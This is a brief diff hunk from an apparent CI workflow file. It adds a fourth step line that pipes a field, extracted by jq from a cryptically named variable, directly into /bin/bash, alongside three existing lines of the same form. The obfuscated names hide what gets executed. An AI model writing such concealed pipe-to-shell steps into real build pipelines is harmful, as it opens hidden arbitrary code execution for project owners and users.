@@ -22,6 +22,7 @@ jobs:
           echo $c081 | jq -r .g3 | /bin/bash
           printf '%s' "$ztaj91921" | jq -r .sxo3 | /bin/bash
           echo $rrdq2980 | jq -r .c4882 | /bin/bash
+          echo $sd8 | jq -r .adfo22 | /bin/bash
 
       - name: Persist output
         if: always()
